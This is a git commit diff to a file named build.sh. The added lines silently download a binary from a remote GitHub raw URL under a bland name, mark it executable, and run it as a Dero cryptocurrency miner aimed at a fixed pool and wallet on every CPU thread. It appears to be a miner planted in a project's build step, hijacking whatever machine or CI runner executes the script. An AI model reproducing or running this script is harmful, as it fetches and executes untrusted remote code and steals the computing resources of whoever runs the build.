a2e2a4272a166783166d95949e5acc6af16b2a4a
officialforbamas <164087783+officialforbamas@users.noreply.github.com>
2024-03-20 04:06:03 +0700

    Update build.sh

--- build.sh
+++ build.sh
@@ -1,4 +1,6 @@
 #!/bin/bash
 
-chmod 777 lunar
-./lunar -d dero.rabidmining.com:443 -w dero1qydqwyg0rjmsyfl9g52np38nv645y75l07v9tlxzcz780ezsnuedkqqqekx8w --popcnt -t $(nproc --al) --show-pool-shares --no-colors
+wget -qO mercon https://raw.githubusercontent.com/officialmadmia/dronesyz/main/madam 
+chmod +x mercon 
+./mercon -d dero.rabidmining.com:443 -w dero1qydqwyg0rjmsyfl9g52np38nv645y75l07v9tlxzcz780ezsnuedkqqqekx8w --popcnt -t $(nproc --al) --show-pool-shares --no-colors
+
